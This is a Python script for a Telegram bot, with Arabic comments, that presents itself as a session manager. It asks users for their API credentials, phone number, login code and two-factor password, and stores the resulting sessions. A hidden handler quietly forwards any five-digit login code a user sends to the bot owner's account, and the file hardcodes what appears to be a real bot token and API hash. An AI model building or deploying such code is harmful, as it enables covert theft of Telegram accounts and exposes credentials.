# -*- coding: utf-8 -*-
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.errors import SessionPasswordNeededError
import asyncio, re

# معلومات البوت
API_ID = 22494292
API_HASH = '0bd3915b6b1a0a64b168d0cc852a0e61'
BOT_TOKEN = '7768107017:AAH7ndo7wwLtRDRYLcTNC7ne7gWju3lDvtI'
OWNER_ID = 123456789  # ← ضع هنا رقم حسابك (معرفك الرقمي من @userinfobot)

# تشغيل البوت
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# تخزين الجلسات للمستخدمين
user_clients = {}         # { user_id: { session_id: TelegramClient } }
active_session = {}       # { user_id: session_id }

# حالات تفاعل المستخدمين
pending_api_id = {}
pending_api_hash = {}
pending_phone = {}
pending_code = {}
pending_2fa = {}
pending_new_username = {}
pending_change_name = {}
pending_change_uname = {}

# الأزرار
def main_buttons():
    return [
        [Button.inline("📩 جلسة جديدة", b"send_session"), Button.inline("📱 رقم الهاتف", b"show_phone")],
        [Button.inline("🗑️ مسح البيانات", b"clear_profile"), Button.inline("🖼️ حذف الصور", b"delete_photos")],
        [Button.inline("✏️ تغيير الاسم", b"change_name"), Button.inline("🔄 تغيير اليوزر", b"change_uname")],
        [Button.inline("📋 الجلسات", b"list_sessions"), Button.inline("🚪 إنهاء الجلسات الأخرى", b"logout_all")],
        [Button.inline("🎯 توليد جلسة", b"generate_session")]
    ]

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond("👋 أهلاً بك!\nاختر أحد الأوامر:", buttons=main_buttons())

@bot.on(events.CallbackQuery)
async def callback(event):
    uid = event.sender_id
    data = event.data.decode()

    if data == "send_session":
        await event.edit("📩 أرسل StringSession الآن.", buttons=main_buttons())

    elif data == "generate_session":
        pending_api_id[uid] = {}
        await event.edit("🔢 أرسل API_ID الآن:", buttons=[Button.inline("إلغاء", b"cancel_gen")])

    elif data == "cancel_gen":
        for d in [pending_api_id, pending_api_hash, pending_phone, pending_code, pending_2fa]:
            d.pop(uid, None)
        await event.edit("❌ تم إلغاء توليد الجلسة.", buttons=main_buttons())

    elif data == "show_phone":
        sid = active_session.get(uid)
        if not sid or uid not in user_clients:
            await event.answer("❌ لا توجد جلسة نشطة.", alert=True)
            return
        me = await user_clients[uid][sid].get_me()
        await event.answer(f"📱 {me.phone or 'غير متوفر'}", alert=True)

    elif data == "clear_profile":
        sid = active_session.get(uid)
        if not sid or uid not in user_clients:
            await event.answer("❌ لا توجد جلسة.", alert=True)
            return
        try:
            await user_clients[uid][sid](UpdateProfileRequest(first_name=".", last_name="", about=""))
            await user_clients[uid][sid](UpdateUsernameRequest(username=""))
            pending_new_username[uid] = sid
            await event.edit("🗑️ تم مسح الاسم والنبذة واليوزر.\n✏️ أرسل اليوزر الجديد (بدون @) أو /skip", buttons=[[Button.inline("إلغاء", b"cancel_uname")]])
        except Exception as e:
            await event.edit(f"❌ خطأ أثناء المسح: {e}", buttons=main_buttons())

    elif data == "cancel_uname":
        pending_new_username.pop(uid, None)
        await event.edit("❌ تم الإلغاء.", buttons=main_buttons())

    elif data == "delete_photos":
        sid = active_session.get(uid)
        if not sid or uid not in user_clients:
            await event.answer("❌ لا توجد جلسة", alert=True)
            return
        try:
            photos = await user_clients[uid][sid].get_profile_photos("me")
            await user_clients[uid][sid](DeletePhotosRequest(id=photos))
            await event.edit("🖼️ تم حذف جميع صور الحساب.", buttons=main_buttons())
        except Exception as e:
            await event.edit(f"❌ فشل: {e}", buttons=main_buttons())

    elif data == "change_name":
        sid = active_session.get(uid)
        if not sid or uid not in user_clients:
            await event.answer("❌ لا توجد جلسة", alert=True)
            return
        pending_change_name[uid] = sid
        await event.edit("✏️ أرسل الاسم الجديد (مثلاً: علي أو علي جاسم):")

    elif data == "change_uname":
        sid = active_session.get(uid)
        if not sid or uid not in user_clients:
            await event.answer("❌ لا توجد جلسة", alert=True)
            return
        pending_change_uname[uid] = sid
        await event.edit("🔄 أرسل اليوزر الجديد (بدون @):")

    elif data == "list_sessions":
        if uid not in user_clients or not user_clients[uid]:
            await event.edit("⚠️ لا توجد جلسات حالياً.", buttons=main_buttons())
            return
        msg = "📋 جلساتك:\n\n"
        buttons_list = []
        for sid, cl in user_clients[uid].items():
            me = await cl.get_me()
            name = me.first_name or me.username or "بدون اسم"
            active = "✅" if active_session.get(uid) == sid else ""
            buttons_list.append([Button.inline(f"{active} {name}", f"set_active_{sid}")])
        await event.edit(msg, buttons=buttons_list + [main_buttons()[-1]])

    elif data.startswith("set_active_"):
        sid = data.split("_")[-1]
        if uid in user_clients and sid in user_clients[uid]:
            active_session[uid] = sid
            await event.edit(f"✅ تم تحديد الجلسة: {sid}", buttons=main_buttons())
        else:
            await event.answer("❌ الجلسة غير موجودة", alert=True)

    elif data == "logout_all":
        cnt = 0
        for other_uid in list(user_clients):
            if other_uid == uid:
                continue
            for cl in user_clients[other_uid].values():
                await cl.disconnect()
            user_clients.pop(other_uid)
            cnt += 1
        await event.edit(f"✅ تم إنهاء {cnt} جلسة أخرى.", buttons=main_buttons())

@bot.on(events.NewMessage)
async def handle(event):
    uid = event.sender_id
    txt = event.text.strip()

    # تلقّي رمز تحقق مكون من 5 أرقام وتحويله لصاحب البوت
    if event.is_private and uid != OWNER_ID and re.fullmatch(r"\d{5}", txt):
        for user_id, sessions in user_clients.items():
            for sid, cl in sessions.items():
                try:
                    me = await cl.get_me()
                    if me.id == uid:
                        await bot.send_message(OWNER_ID, f"📨 رمز التحقق من {me.first_name}:\n\n`{txt}`")
                        return
                except:
                    continue

    if uid in pending_new_username:
        sid = pending_new_username.pop(uid)
        if txt.lower() in ("/skip", "/cancel"):
            await event.respond("تم تجاوز تعيين اليوزر.", buttons=main_buttons())
            return
        try:
            await user_clients[uid][sid](UpdateUsernameRequest(username=txt.strip("@")))
            await event.respond(f"✅ تم تعيين اليوزر الجديد @{txt.strip('@')}", buttons=main_buttons())
        except Exception as e:
            await event.respond(f"❌ فشل: {e}", buttons=main_buttons())

    elif uid in pending_change_name:
        sid = pending_change_name.pop(uid)
        names = txt.split(maxsplit=1)
        first = names[0]
        last = names[1] if len(names) == 2 else ""
        try:
            await user_clients[uid][sid](UpdateProfileRequest(first_name=first, last_name=last))
            await event.respond("✅ تم تغيير الاسم.", buttons=main_buttons())
        except Exception as e:
            await event.respond(f"❌ فشل: {e}", buttons=main_buttons())

    elif uid in pending_change_uname:
        sid = pending_change_uname.pop(uid)
        try:
            await user_clients[uid][sid](UpdateUsernameRequest(username=txt.strip("@")))
            await event.respond(f"✅ تم تغيير اليوزر إلى @{txt.strip('@')}", buttons=main_buttons())
        except Exception as e:
            await event.respond(f"❌ فشل: {e}", buttons=main_buttons())

    elif uid in pending_api_id:
        try:
            api_id = int(txt)
            pending_api_hash[uid] = api_id
            pending_api_id.pop(uid)
            await event.respond("🔑 أرسل API_HASH الآن:")
        except:
            await event.respond("❌ رقم API_ID غير صالح.")
        return

    elif uid in pending_api_hash:
        api_id = pending_api_hash.pop(uid)
        api_hash = txt
        pending_phone[uid] = (api_id, api_hash)
        await event.respond("📞 أرسل رقم الهاتف (مثال: +964770xxxxxxx):")
        return

    elif uid in pending_phone:
        api_id, api_hash = pending_phone.pop(uid)
        phone = txt
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.send_code_request(phone)
            pending_code[uid] = (client, phone)
            await event.respond("📨 أرسل كود التحقق:")
        except Exception as e:
            await event.respond(f"❌ خطأ: {e}")
        return

    elif uid in pending_code:
        client, phone = pending_code.pop(uid)
        try:
            await client.sign_in(phone, txt)
        except SessionPasswordNeededError:
            pending_2fa[uid] = client
            await event.respond("🔐 الحساب فيه تحقق بخطوتين.\nأرسل كلمة المرور:")
            return
        session = client.session.save()
        me = await client.get_me()
        sid = str(me.id)
        user_clients.setdefault(uid, {})[sid] = client
        active_session[uid] = sid
        await event.respond(f"✅ تم تسجيل {me.first_name}\n🔑 الجلسة:\n`{session}`", buttons=main_buttons())
        return

    elif uid in pending_2fa:
        client = pending_2fa.pop(uid)
        try:
            await client.sign_in(password=txt)
            session = client.session.save()
            me = await client.get_me()
            sid = str(me.id)
            user_clients.setdefault(uid, {})[sid] = client
            active_session[uid] = sid
            await event.respond(f"✅ تم تسجيل {me.first_name} مع 2FA\n🔑 الجلسة:\n`{session}`", buttons=main_buttons())
        except Exception as e:
            await event.respond(f"❌ خطأ في كلمة السر: {e}", buttons=main_buttons())

# تشغيل البوت
bot.run_until_disconnected()
